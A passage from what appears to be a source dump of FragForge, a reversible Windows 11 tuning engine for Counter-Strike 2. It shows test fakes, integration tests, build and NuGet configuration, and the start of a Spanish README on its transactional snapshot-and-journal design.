    public Task<RestorePointResult> CreateAsync(string description, CancellationToken cancellationToken = default)
    {
        CreateCalls++;
        if (FailCreate) throw new InvalidOperationException("Restore point failed (fake).");
        return Task.FromResult(new RestorePointResult(42, "Punto creado (fake)."));
    }
}
public sealed class FakeServiceController : IServiceController
{
    public Dictionary<string, ServiceCapture> Services { get; } = new(StringComparer.OrdinalIgnoreCase);
    public List<(string Name, string StartMode, bool? Delayed, bool RestoreAbsentDelayed)> StartModeCalls { get; } = [];
    public List<(string Name, string State)> StateCalls { get; } = [];
    public Task<ServiceCapture> GetAsync(string name, CancellationToken cancellationToken = default) => Task.FromResult(Services.TryGetValue(name, out var service) ? service : new ServiceCapture { Name = name, Exists = false });
    public Task SetStartModeAsync(string name, string startMode, bool? delayedAutoStart, CancellationToken cancellationToken = default, bool restoreAbsentDelayed = false)
    {
        StartModeCalls.Add((name, startMode, delayedAutoStart, restoreAbsentDelayed));
        var current = Services.TryGetValue(name, out var service) ? service : new ServiceCapture { Name = name, Exists = false };
        Services[name] = restoreAbsentDelayed
            ? current with { Exists = true, StartMode = startMode, DelayedAutoStart = false, DelayedAutoStartExisted = false }
            : current with { Exists = true, StartMode = startMode, DelayedAutoStart = delayedAutoStart ?? current.DelayedAutoStart ?? false, DelayedAutoStartExisted = true };
        return Task.CompletedTask;
    }
    public Task SetStateAsync(string name, string state, CancellationToken cancellationToken = default)
    {
        StateCalls.Add((name, state));
        var current = Services.TryGetValue(name, out var service) ? service : new ServiceCapture { Name = name, Exists = false };
        Services[name] = current with { Exists = true, State = state };
        return Task.CompletedTask;
    }
}
public sealed class FakeScheduledTaskStore : IScheduledTaskStore
{
    public Dictionary<string, ScheduledTaskActionState> Tasks { get; } = new(StringComparer.OrdinalIgnoreCase);
    public List<(string Path, bool Enabled)> Calls { get; } = [];
    public Task<ScheduledTaskActionState> GetAsync(string path, CancellationToken cancellationToken = default) => Task.FromResult(Tasks.TryGetValue(path, out var task) ? task : new ScheduledTaskActionState { Path = path, Exists = false, Enabled = false });
    public Task SetEnabledAsync(string path, bool enabled, CancellationToken cancellationToken = default)
    {
        Calls.Add((path, enabled));
        var current = Tasks.TryGetValue(path, out var task) ? task : new ScheduledTaskActionState { Path = path, Exists = false, Enabled = false };
        Tasks[path] = current with { Exists = true, Enabled = enabled };
        return Task.CompletedTask;
    }
}
public sealed class FakeNetworkAdapterController : INetworkAdapterController
{
    public Dictionary<(string Adapter, string Keyword), NetworkPropertyCapture> Properties { get; } = new();
    public List<(string Adapter, string Keyword, IReadOnlyList<string> Value)> Calls { get; } = [];
    public Task<NetworkPropertyCapture> GetAsync(string adapterName, string keyword, CancellationToken cancellationToken = default) => Task.FromResult(Properties.TryGetValue((adapterName, keyword), out var capture) ? capture : new NetworkPropertyCapture { AdapterName = adapterName, Keyword = keyword, Exists = false });
    public Task SetAsync(string adapterName, string keyword, IReadOnlyList<string> value, CancellationToken cancellationToken = default)
    {
        Calls.Add((adapterName, keyword, value));
        var current = Properties.TryGetValue((adapterName, keyword), out var capture) ? capture : new NetworkPropertyCapture { AdapterName = adapterName, Keyword = keyword, Exists = false };
        Properties[(adapterName, keyword)] = current with { Exists = true, RegistryValue = value };
        return Task.CompletedTask;
    }
}
public sealed class FakeGameLocator : IGameLocator
{
    public GameInfo Info { get; set; } = TestProfiles.Pn64().Games;
    public Task<GameInfo> LocateCs2Async(CancellationToken cancellationToken = default) => Task.FromResult(Info);
}
public sealed class FakeWmiQuery : IWmiQuery
{
    public Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>> QueryAsync(string scope, string className, IReadOnlyList<string> properties, string? where = null, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<IReadOnlyDictionary<string, object?>>>([]);
}
public sealed class FakeConditionFactoryProbe : ITweakConditionFactory
{
    private readonly FragForge.Core.Conditions.ConditionFactory _inner = new();
    public IReadOnlySet<string> SupportedTypes => _inner.SupportedTypes;
    public ITweakCondition Create(ConditionSpec specification) => _inner.Create(specification);
}
public sealed class FakeJournal : IJournal
{
    public List<JournalEntry> Entries { get; } = [];
    public bool Corrupt { get; set; }
    public Task AppendAsync(JournalEntry entry, CancellationToken cancellationToken = default) { Entries.Add(entry with { Hash = entry.Hash.Length == 0 ? Guid.NewGuid().ToString("N") : entry.Hash }); return Task.CompletedTask; }
    public Task<IReadOnlyList<JournalEntry>> ReadAllAsync(CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<JournalEntry>>(Entries.ToArray());
    public Task<JournalIntegrity> VerifyIntegrityAsync(CancellationToken cancellationToken = default) => Task.FromResult(Corrupt ? new JournalIntegrity(false, Entries.Count, "Cadena rota (fake).") : new JournalIntegrity(true, Entries.Count, null));
}
public sealed class FakeClock
{
    public DateTimeOffset Now { get; set; } = new(2026, 11, 13, 12, 0, 0, TimeSpan.Zero);
}
````

### `tests/FragForge.Tests/Fakes/FakeProcessRunner.cs`  <sub>(16 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Tests.Fakes;

public sealed class FakeProcessRunner : IProcessRunner
{
    public List<ProcessRequest> Requests { get; } = [];
    public Func<ProcessRequest, ProcessResult>? Handler { get; set; }
    public Task<ProcessResult> RunAsync(ProcessRequest request, CancellationToken cancellationToken = default)
    {
        Requests.Add(request);
        cancellationToken.ThrowIfCancellationRequested();
        return Task.FromResult(Handler?.Invoke(request) ?? new ProcessResult(0, "", "", false));
    }
    public int CountContaining(string argument) => Requests.Count(r => r.Arguments.Any(a => a.Contains(argument, StringComparison.OrdinalIgnoreCase)));
}
````

### `tests/FragForge.Tests/Fakes/FakeRegistry.cs`  <sub>(62 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Tests.Fakes;

public sealed class FakeRegistry : IRegistry
{
    public Dictionary<string, Dictionary<string, (string Kind, object Data)>> Keys { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Dictionary<string, int> Writes { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Dictionary<string, int> Deletes { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Dictionary<string, int> ReadCount { get; } = new(StringComparer.OrdinalIgnoreCase);
    public Action<string, string>? BeforeWrite { get; set; }
    public bool ThrowOnRead { get; set; }
    private static string Normalize(string key) => key.Trim().TrimEnd('\\');
    private static string Path(string key, string name) => Normalize(key) + "::" + name;
    public Task<bool> KeyExistsAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult(Keys.ContainsKey(Normalize(key)));
    public Task<RegistryReadResult> ReadValueAsync(string key, string name, CancellationToken cancellationToken = default)
    {
        if (ThrowOnRead) throw new IOException("Fake registry read failure.");
        var canonical = Normalize(key);
        ReadCount[Path(canonical, name)] = ReadCount.GetValueOrDefault(Path(canonical, name)) + 1;
        if (!Keys.TryGetValue(canonical, out var values)) return Task.FromResult(new RegistryReadResult(false, false, null, null));
        return Task.FromResult(values.TryGetValue(name, out var value) ? new RegistryReadResult(true, true, value.Kind, value.Data) : new RegistryReadResult(true, false, null, null));
    }
    public Task<IReadOnlyList<string>> GetValueNamesAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<string>>(Keys.TryGetValue(Normalize(key), out var values) ? values.Keys.ToArray() : []);
    public Task<IReadOnlyList<string>> GetSubKeyNamesAsync(string key, CancellationToken cancellationToken = default)
    {
        var canonical = Normalize(key) + "\\";
        return Task.FromResult<IReadOnlyList<string>>(Keys.Keys.Where(k => k.StartsWith(canonical, StringComparison.OrdinalIgnoreCase) && !k[canonical.Length..].Contains('\\')).Select(k => k[canonical.Length..]).ToArray());
    }
    public Task WriteValueAsync(string key, string name, RegistryWriteValue value, CancellationToken cancellationToken = default)
    {
        BeforeWrite?.Invoke(key, name);
        var canonical = Normalize(key);
        if (!Keys.TryGetValue(canonical, out var values)) { values = new Dictionary<string, (string, object)>(StringComparer.OrdinalIgnoreCase); Keys[canonical] = values; }
        values[name] = (value.Kind, value.Data);
        var path = Path(canonical, name);
        Writes[path] = Writes.GetValueOrDefault(path) + 1;
        return Task.CompletedTask;
    }
    public Task DeleteValueAsync(string key, string name, CancellationToken cancellationToken = default)
    {
        var canonical = Normalize(key);
        if (Keys.TryGetValue(canonical, out var values)) values.Remove(name);
        var path = Path(canonical, name);
        Deletes[path] = Deletes.GetValueOrDefault(path) + 1;
        return Task.CompletedTask;
    }
    public Task DeleteEmptySubKeyAsync(string parentKey, string childName, CancellationToken cancellationToken = default)
    {
        var child = Normalize(parentKey) + "\\" + childName;
        if (Keys.TryGetValue(child, out var values) && values.Count == 0) Keys.Remove(child);
        return Task.CompletedTask;
    }
    public void Set(string key, string name, string kind, object data)
    {
        var canonical = Normalize(key);
        if (!Keys.TryGetValue(canonical, out var values)) { values = new Dictionary<string, (string, object)>(StringComparer.OrdinalIgnoreCase); Keys[canonical] = values; }
        values[name] = (kind, data);
    }
    public string? GetString(string key, string name) => Keys.TryGetValue(Normalize(key), out var values) && values.TryGetValue(name, out var value) ? value.Data as string : null;
    public int? GetInt(string key, string name) => Keys.TryGetValue(Normalize(key), out var values) && values.TryGetValue(name, out var value) ? value.Data as int? : null;
}
````

### `tests/FragForge.Tests/Fakes/TestSupport.cs`  <sub>(116 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Tests.Fakes;

public static class Spec
{
    public static ActionSpec Action(string kind, object? parameters = null) => new() { Kind = kind, Parameters = parameters is null ? default : JsonSerializer.SerializeToElement(parameters, JsonDefaults.Options) };
    public static ConditionSpec Condition(string type, object? parameters = null) => new() { Type = type, Parameters = parameters is null ? default : JsonSerializer.SerializeToElement(parameters, JsonDefaults.Options) };
    public static object Registry(params object[] values) => new { values };
    public static object Value(string key, string name, string kind, object value, string mode = "Set") => new { key, name, kind, value, mode };
}

public static class Tweak
{
    public static TweakDefinition Create(string id, ActionSpec action, RiskLevel risk = RiskLevel.Safe, EvidenceLevel evidence = EvidenceLevel.High, IReadOnlyList<ConditionSpec>? conditions = null, IReadOnlyList<string>? dependsOn = null, IReadOnlyList<string>? conflictsWith = null, IReadOnlyList<string>? tags = null, bool requiresReboot = false, bool requiresAdmin = true) => new()
    {
        Id = id,
        Category = "Latency",
        Title = new LocalizedText { EsMx = "Prueba " + id, EnUs = "Test " + id },
        Description = new LocalizedText { EsMx = "Descripción " + id, EnUs = "Description " + id },
        Evidence = evidence,
        Risk = risk,
        RequiresReboot = requiresReboot,
        RequiresAdmin = requiresAdmin,
        Conditions = conditions ?? [],
        Actions = [action],
        Tags = tags ?? [],
        ConflictsWith = conflictsWith ?? [],
        DependsOn = dependsOn ?? [],
        ExpectedImpact = new ExpectedImpact(),
        References = ["https://example.invalid/test"],
        Notes = new LocalizedText { EsMx = "Notas", EnUs = "Notes" },
        WhenNotToApply = new LocalizedText { EsMx = "No aplicar", EnUs = "Do not apply" }
    };
}

public sealed record ScriptedActionOptions
{
    public bool FailApply { get; init; }
    public bool FailVerify { get; init; }
    public bool FailRevert { get; init; }
    public Action<string>? OnRevert { get; init; }
}

public sealed class ScriptedAction(ScriptedActionOptions options, List<string> trace, string label) : ITweakAction
{
    private bool _applied;
    public string Kind => "Fake";
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.CompletedTask;
    public Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult<ActionState>(new InspectionActionState());
    public Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        trace.Add("apply:" + label);
        if (options.FailApply) throw new VerificationFailedException("apply failed (fake)");
        _applied = true;
        return Task.CompletedTask;
    }
    public Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        trace.Add("verify:" + label);
        if (options.FailVerify) return Task.FromResult(VerificationResult.Missing("verify failed (fake)"));
        return Task.FromResult(_applied ? VerificationResult.Match("ok (fake)") : VerificationResult.Missing("not applied yet (fake)"));
    }
    public Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        trace.Add("revert:" + label);
        options.OnRevert?.Invoke(label);
        if (options.FailRevert) throw new InvalidOperationException("revert failed (fake)");
        _applied = false;
        return Task.CompletedTask;
    }
    public Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult(VerificationResult.Match("reverted (fake)"));
    public Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult("fake dry-run: " + label);
}

public sealed class FakeActionFactory(IRegistry registry, IProtectionPolicy policy, Dictionary<string, ScriptedActionOptions>? scripts = null) : ITweakActionFactory
{
    public List<string> Trace { get; } = [];
    public IReadOnlySet<string> SupportedKinds { get; } = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "Registry", "Fake" };
    public ITweakAction Create(ActionSpec specification)
    {
        if (specification.Kind.Equals("Registry", StringComparison.OrdinalIgnoreCase)) return new FragForge.Actions.Registry.RegistryAction(registry, policy, specification);
        var id = specification.Parameters.ValueKind == JsonValueKind.Undefined ? "fake" : specification.Parameters.GetProperty("id").GetString() ?? "fake";
        var options = scripts is not null && scripts.TryGetValue(id, out var scripted) ? scripted : new ScriptedActionOptions();
        return new ScriptedAction(options, Trace, id);
    }
}

public sealed class NullExperimentHook : IExperimentHook
{
    public int Order => 0;
    public Task<IReadOnlyList<ExperimentArtifact>> RunAsync(ExperimentContext context, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<ExperimentArtifact>>([]);
}

public sealed class ThrowingExperimentHook : IExperimentHook
{
    public int Order => 0;
    public Task<IReadOnlyList<ExperimentArtifact>> RunAsync(ExperimentContext context, CancellationToken cancellationToken = default) => throw new InvalidOperationException("hook failed (fake)");
}

public sealed class TempDirectory : IDisposable
{
    public string Path { get; }
    public TempDirectory()
    {
        Path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "fragforge-tests", Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(Path);
    }
    public void Dispose()
    {
        try { if (Directory.Exists(Path)) Directory.Delete(Path, true); } catch (IOException) { } catch (UnauthorizedAccessException) { }
    }
}
````

### `tests/FragForge.Tests/FragForge.Tests.csproj`  <sub>(15 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <IsPackable>false</IsPackable>
    <IsTestProject>true</IsTestProject>
  </PropertyGroup>
  <ItemGroup>
    <ProjectReference Include="../../src/FragForge.Core/FragForge.Core.csproj" />
    <ProjectReference Include="../../src/FragForge.Actions/FragForge.Actions.csproj" />
    <ProjectReference Include="../../src/FragForge.Tweaks/FragForge.Tweaks.csproj" />
    <ProjectReference Include="../../src/FragForge.Composition/FragForge.Composition.csproj" />
    <PackageReference Include="Microsoft.NET.Test.Sdk" />
    <PackageReference Include="xunit" />
    <PackageReference Include="xunit.runner.visualstudio"><PrivateAssets>all</PrivateAssets></PackageReference>
  </ItemGroup>
</Project>
````

### `tests/FragForge.Tests/Integration/CompositionIntegrationTests.cs`  <sub>(97 líneas)</sub>

````csharp
using FragForge.Composition;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Tests.Fakes;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Xunit;

namespace FragForge.Tests.Integration;

public sealed class CompositionIntegrationTests
{
    private static ShellOptions Options(string dataRoot) => new(dataRoot, "es-MX", ConsoleLogging: false);

    [Fact]
    public async Task CompositionRoot_ResolvesEveryService_AndLoadsTheEmbeddedCatalog()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var catalog = host.Services.GetRequiredService<ITweakCatalog>();
        Assert.Equal(10, catalog.Definitions.Count);
        Assert.NotNull(host.Services.GetRequiredService<ITweakEngine>());
        Assert.NotNull(host.Services.GetRequiredService<IHardwareProfiler>());
        Assert.NotNull(host.Services.GetRequiredService<IReportService>());
        Assert.NotNull(host.Services.GetRequiredService<IJournal>());
        Assert.NotNull(host.Services.GetRequiredService<ISnapshotStore>());
        Assert.NotNull(host.Services.GetRequiredService<IProtectionPolicy>());
        Assert.NotNull(host.Services.GetRequiredService<ITweakActionFactory>());
        Assert.NotNull(host.Services.GetRequiredService<FragForge.Core.Localization.Localizer>());
        Assert.NotNull(host.Services.GetRequiredService<IExecutionGate>());
    }

    [Fact]
    public async Task ScanAndDryRun_WorkOnAnyPlatform_BecauseEverythingIsFakedOrGuarded()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var engine = host.Services.GetRequiredService<ITweakEngine>();
        var scan = await engine.ScanAsync();
        Assert.Equal(10, scan.Tweaks.Count);
        if (!OperatingSystem.IsWindows()) Assert.True(scan.Hardware.IsUnsupportedPlatform);
        var report = await engine.ApplyAsync(scan.Tweaks.Select(t => t.Id), new ApplyOptions { DryRun = true, Profile = TweakProfile.Advanced, CreateRestorePoint = true, TargetUserSid = "S-1-5-21-1-2-3-1001" });
        Assert.True(report.DryRun);
        Assert.Null(report.SnapshotId);
    }

    [Fact]
    public async Task Report_IsGeneratedAsJsonAndHtml_WithAllSections()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var reports = host.Services.GetRequiredService<IReportService>();
        var json = Path.Combine(directory.Path, "reports", "report.json");
        var html = Path.Combine(directory.Path, "reports", "report.html");
        await reports.ExportAsync(json, "json");
        await reports.ExportAsync(html, "html");
        Assert.True(File.Exists(json));
        Assert.True(File.Exists(html));
        var jsonText = await File.ReadAllTextAsync(json);
        Assert.Contains("\"hardware\"", jsonText, StringComparison.Ordinal);
        Assert.Contains("\"tweaks\"", jsonText, StringComparison.Ordinal);
        Assert.Contains("\"preflight\"", jsonText, StringComparison.Ordinal);
        Assert.Contains("\"journalIntegrity\"", jsonText, StringComparison.Ordinal);
        var htmlText = await File.ReadAllTextAsync(html);
        Assert.Contains("<html", htmlText, StringComparison.Ordinal);
        Assert.Contains("FragForge", htmlText, StringComparison.Ordinal);
        Assert.Contains("Journal:", htmlText, StringComparison.Ordinal);
    }

    [Fact]
    public async Task PersonalDenylist_IsMergedFromProgramData()
    {
        using var directory = new TempDirectory();
        var policyPath = Path.Combine(directory.Path, "policy", "denylist.json");
        Directory.CreateDirectory(Path.GetDirectoryName(policyPath)!);
        await File.WriteAllTextAsync(policyPath, """{"schemaVersion":1,"services":["DiagTrack"],"registryKeyPrefixes":["HKLM\\SOFTWARE\\Policies\\Example"],"registryValueNames":[],"taskPrefixes":[],"bcdDenyElements":[],"bcdAllowedElements":["disabledynamictick"],"filePrefixes":[],"networkPropertyKeywords":[],"powerShellDeniedTokens":[]}""");
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var policy = host.Services.GetRequiredService<IProtectionPolicy>();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureServiceAllowed("DiagTrack"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureRegistryAllowed(@"HKLM\SOFTWARE\Policies\Example\X", "Y"));
    }

    [Fact]
    public async Task SnapshotStoreAndJournal_PersistUnderTheConfiguredDataRoot()
    {
        using var directory = new TempDirectory();
        using var host = await CompositionRoot.BuildAsync(Options(directory.Path));
        var engine = host.Services.GetRequiredService<ITweakEngine>();
        var snapshots = host.Services.GetRequiredService<ISnapshotStore>();
        Assert.StartsWith(directory.Path, snapshots.RootPath, StringComparison.Ordinal);
        var report = await engine.ApplyAsync(["diagnostics.system-inspect"], new ApplyOptions { DryRun = true, Profile = TweakProfile.Advanced });
        Assert.True(report.Success, string.Join(" ", report.Errors));
        Assert.True(Directory.Exists(Path.Combine(directory.Path, "journal")));
        var journal = host.Services.GetRequiredService<IJournal>();
        Assert.True((await journal.ReadAllAsync()).Count > 0);
    }
}
````

---

## 3h. Raíz de la solución, build, documentación y CI

### `Directory.Build.props`  <sub>(17 líneas)</sub>

````xml
<Project>
  <PropertyGroup>
    <TargetFramework>net10.0</TargetFramework>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
    <LangVersion>latest</LangVersion>
    <Deterministic>true</Deterministic>
    <EnableNETAnalyzers>true</EnableNETAnalyzers>
    <AnalysisLevel>latest</AnalysisLevel>
    <TreatWarningsAsErrors Condition="'$(MSBuildProjectName)' == 'FragForge.Core'">true</TreatWarningsAsErrors>
    <ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally>
    <NuGetAudit>true</NuGetAudit>
    <Version>0.1.0</Version>
    <Authors>FragForge contributors</Authors>
    <Product>FragForge</Product>
  </PropertyGroup>
</Project>
````

### `Directory.Packages.props`  <sub>(18 líneas)</sub>

````xml
<Project>
  <ItemGroup>
    <PackageVersion Include="Microsoft.Extensions.DependencyInjection" Version="10.0.11" />
    <PackageVersion Include="Microsoft.Extensions.DependencyInjection.Abstractions" Version="10.0.11" />
    <PackageVersion Include="Microsoft.Extensions.Hosting" Version="10.0.11" />
    <PackageVersion Include="Microsoft.Extensions.Logging.Abstractions" Version="10.0.11" />
    <PackageVersion Include="Serilog" Version="4.3.0" />
    <PackageVersion Include="Serilog.Extensions.Hosting" Version="10.0.0" />
    <PackageVersion Include="Serilog.Sinks.Console" Version="6.1.1" />
    <PackageVersion Include="Serilog.Sinks.File" Version="7.0.0" />
    <PackageVersion Include="Serilog.Formatting.Compact" Version="3.0.0" />
    <PackageVersion Include="System.Management" Version="10.0.11" />
    <PackageVersion Include="CommunityToolkit.Mvvm" Version="8.4.1" />
    <PackageVersion Include="Microsoft.NET.Test.Sdk" Version="17.14.1" />
    <PackageVersion Include="xunit" Version="2.9.3" />
    <PackageVersion Include="xunit.runner.visualstudio" Version="3.1.4" />
  </ItemGroup>
</Project>
````

### `global.json`  <sub>(3 líneas)</sub>

````json
{
  "sdk": { "version": "10.0.400", "rollForward": "latestFeature", "allowPrerelease": false }
}
````

### `NuGet.config`  <sub>(7 líneas)</sub>

````xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <clear />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
  </packageSources>
</configuration>
````

### `NuGet.offline.config`  <sub>(9 líneas)</sub>

````xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <clear />
  </packageSources>
  <fallbackPackageFolders>
    <add key="offline" value="%FRAGFORGE_PACKAGES%" />
  </fallbackPackageFolders>
</configuration>
````

### `FragForge.sln`  <sub>(54 líneas)</sub>

````text
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.0.31903.59
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FragForge.Core", "src\FragForge.Core\FragForge.Core.csproj", "{10000000-0000-0000-0000-000000000001}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FragForge.Actions", "src\FragForge.Actions\FragForge.Actions.csproj", "{10000000-0000-0000-0000-000000000002}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FragForge.Tweaks", "src\FragForge.Tweaks\FragForge.Tweaks.csproj", "{10000000-0000-0000-0000-000000000003}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FragForge.Composition", "src\FragForge.Composition\FragForge.Composition.csproj", "{10000000-0000-0000-0000-000000000004}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FragForge.Cli", "src\FragForge.Cli\FragForge.Cli.csproj", "{10000000-0000-0000-0000-000000000005}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FragForge.App", "src\FragForge.App\FragForge.App.csproj", "{10000000-0000-0000-0000-000000000006}"
EndProject
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "FragForge.Tests", "tests\FragForge.Tests\FragForge.Tests.csproj", "{10000000-0000-0000-0000-000000000007}"
EndProject
Global
  GlobalSection(SolutionConfigurationPlatforms) = preSolution
    Debug|Any CPU = Debug|Any CPU
    Release|Any CPU = Release|Any CPU
  EndGlobalSection
  GlobalSection(ProjectConfigurationPlatforms) = postSolution
    {10000000-0000-0000-0000-000000000001}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {10000000-0000-0000-0000-000000000001}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {10000000-0000-0000-0000-000000000001}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {10000000-0000-0000-0000-000000000001}.Release|Any CPU.Build.0 = Release|Any CPU
    {10000000-0000-0000-0000-000000000002}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {10000000-0000-0000-0000-000000000002}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {10000000-0000-0000-0000-000000000002}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {10000000-0000-0000-0000-000000000002}.Release|Any CPU.Build.0 = Release|Any CPU
    {10000000-0000-0000-0000-000000000003}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {10000000-0000-0000-0000-000000000003}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {10000000-0000-0000-0000-000000000003}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {10000000-0000-0000-0000-000000000003}.Release|Any CPU.Build.0 = Release|Any CPU
    {10000000-0000-0000-0000-000000000004}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {10000000-0000-0000-0000-000000000004}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {10000000-0000-0000-0000-000000000004}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {10000000-0000-0000-0000-000000000004}.Release|Any CPU.Build.0 = Release|Any CPU
    {10000000-0000-0000-0000-000000000005}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {10000000-0000-0000-0000-000000000005}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {10000000-0000-0000-0000-000000000005}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {10000000-0000-0000-0000-000000000005}.Release|Any CPU.Build.0 = Release|Any CPU
    {10000000-0000-0000-0000-000000000006}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {10000000-0000-0000-0000-000000000006}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {10000000-0000-0000-0000-000000000006}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {10000000-0000-0000-0000-000000000006}.Release|Any CPU.Build.0 = Release|Any CPU
    {10000000-0000-0000-0000-000000000007}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
    {10000000-0000-0000-0000-000000000007}.Debug|Any CPU.Build.0 = Debug|Any CPU
    {10000000-0000-0000-0000-000000000007}.Release|Any CPU.ActiveCfg = Release|Any CPU
    {10000000-0000-0000-0000-000000000007}.Release|Any CPU.Build.0 = Release|Any CPU
  EndGlobalSection
EndGlobal
````

### `.gitignore`  <sub>(12 líneas)</sub>

````text
bin/
obj/
out/
publish/
TestResults/
.vs/
.idea/
*.user
*.suo
*.log
artifacts/
.tools/
````

### `README.md`  <sub>(182 líneas)</sub>

````markdown
# FragForge — Capa 0 (fundaciones)

Optimizador **reversible** para Windows 11 orientado a Counter-Strike 2 (FPS, estabilidad de frametime, latencia de entrada y de red). Esta es la **Capa 0**: no promete milagros, sino un motor de cambios *transaccional* con captura exacta del estado previo, verificación, reversión automática y una bitácora a prueba de manipulación.

> Estado actual: solución completa y compilable (Core, Actions, Tweaks, Composition, Cli, App, Tests). La capa de medición A/B pertenece a la Capa 1, pero el motor ya expone los ganchos.

## 1. Decisiones de arquitectura

| Decisión | Por qué |
|---|---|
| **.NET 10 LTS** (`net10.0`; App `net10.0-windows`) | Soporte hasta nov-2028. .NET 8 entra en EOL en nov-2026. |
| **WPF + CommunityToolkit.Mvvm 8.4.1** | WPF viene con Windows (sin runtime extra); el toolkit evita *boilerplate* sin acoplar el motor a la UI. |
| **Microsoft.Extensions.Hosting/DI/Logging + Serilog** | Composición explícita, *fakes* fáciles en tests, log estructurado a archivo rotativo y consola. |
| **Motores y acciones detrás de interfaces** | `IRegistry`, `IProcessRunner`, `IServiceController`, `IExecutionGate`… permiten probar el 100% del motor en Linux con *fakes*. |
| **Catálogo declarativo JSON con esquema propio** | Un tweak = un archivo con textos es-MX/en-US, evidencia, riesgo, condiciones y acciones. Validado por esquema **y** por semántica (IDs, ciclos, conflictos, riesgo). |
| **Snapshot + journal append-only con cadena SHA-256** | Revertir exige prueba del estado previo. El journal detecta ediciones manuales. |
| **Separación captura/restauración vs. catálogo** | Si un tweak desaparece del catálogo, el snapshot sigue pudiendo revertirse porque guarda la definición completa y sus estados. |
| **Denylist central embebida + fusión de política de usuario** | Seguridad por defecto *y* extensibilidad consciente desde `%ProgramData%\FragForge\policy\denylist.json`. |
| **Todo offline** | Sin descargas ni scripts remotos; PowerShell local solo con bandera explícita, hash de scripts y doble confirmación. |

### Flujo de una aplicación
```
preflight → dependencias/conflictos → condiciones → perfil/riesgo → ¿ya aplicado? (idempotencia)
   → snapshot (captura exacta + .reg + .pow/.bcd, punto de restauración)
   → por acción: Apply → Verify   (si Verify falla: rollback inverso del tweak y se detiene el lote)
   → journal (éxito/fallo por tweak)
```

## 2. Árbol de carpetas

```text
Evo_optimizer_CS2/
├─ FragForge.sln
├─ Directory.Build.props / Directory.Packages.props / global.json / NuGet.config
├─ .github/workflows/ci.yml
├─ docs/
│  └─ manual-revert.md
├─ src/
│  ├─ FragForge.Core/                 # motor puro, sin dependencias de Windows
│  │  ├─ Abstractions/               # IRegistry, IProcessRunner, ITweakAction, contratos…
